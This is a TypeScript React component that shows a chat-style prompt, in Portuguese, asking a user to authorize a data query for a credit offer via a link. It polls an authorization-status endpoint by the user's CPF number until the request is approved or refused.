import { useEffect, useRef } from 'react'
import { checkAuthStatus } from '../api'

interface Props {
  link: string
  cpf: string
  onAuthorized: () => void
  onFailed: () => void
}

export default function AuthorizeScreen({ link, cpf, onAuthorized, onFailed }: Props) {
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null)

  useEffect(() => {
    timerRef.current = setInterval(async () => {
      try {
        const result = await checkAuthStatus(cpf)
        if (result.status === 'AUTORIZADO') {
          clearInterval(timerRef.current!)
          onAuthorized()
        } else if (result.status === 'NAO_AUTORIZADO') {
          clearInterval(timerRef.current!)
          onFailed()
        }
        // AGUARDANDO_AUTORIZACAO → continua polling
      } catch {
        // erro de rede → mantém polling
      }
    }, 4000)

    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [cpf, onAuthorized, onFailed])

  return (
    <div className="flex items-end gap-2 max-w-[90%] msg-enter">
      <div className="w-8 h-8 rounded-full bg-wa-header flex items-center justify-center text-white text-[10px] font-bold flex-shrink-0 mb-0.5">
        C6
      </div>
      <div className="bg-white rounded-2xl rounded-tl-none px-4 py-4 shadow-sm flex-1">
        <p className="text-sm text-gray-700 mb-3 leading-relaxed">
          Para liberar o crédito, você precisa autorizar a consulta dos seus dados.
          Clique no botão abaixo e siga as instruções — leva menos de 1 minuto. 👇
        </p>

        <a
          href={link}
          target="_blank"
          rel="noopener noreferrer"
          className="block w-full bg-wa-header text-white text-center font-semibold py-3 px-4 rounded-xl text-sm hover:bg-wa-headerLight transition-colors mb-3"
        >
          ✅ Autorizar Consulta
        </a>

        <div className="flex items-center gap-2 text-xs text-gray-400">
          <span className="flex gap-0.5">
            {[0, 1, 2].map((i) => (
              <span
                key={i}
                className="w-1.5 h-1.5 rounded-full bg-gray-300 inline-block"
                style={{
                  animation: 'bounce-dot 0.8s ease-in-out infinite',
                  animationDelay: `${i * 0.18}s`,
                }}
              />
            ))}
          </span>
          Aguardando sua autorização...
        </div>
      </div>
    </div>
  )
}
